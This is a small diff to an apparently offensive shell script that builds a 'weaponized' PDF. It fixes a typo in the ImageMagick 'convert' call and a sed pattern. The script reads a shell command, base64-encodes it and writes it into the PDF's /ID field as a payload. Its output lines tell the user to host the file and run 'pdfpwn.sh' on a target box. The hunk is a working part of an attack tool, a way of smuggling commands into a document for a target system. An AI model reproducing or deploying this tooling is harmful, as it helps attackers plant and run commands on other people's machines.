@@ -27,7 +27,7 @@ read shell
 
 payload=$(echo $shell | base64)
 
-covert xc:none -page Letter $fname && 
-sed -i "s/^\/ID \[<.*><.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
+convert xc:none -page Letter $fname && 
+sed -i "s/^\/ID \[<.*> <.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
 echo "[+] $fname PDF weaponized"
 echo "[+] Host it on a webserver and run pdfpwn.sh on target box"
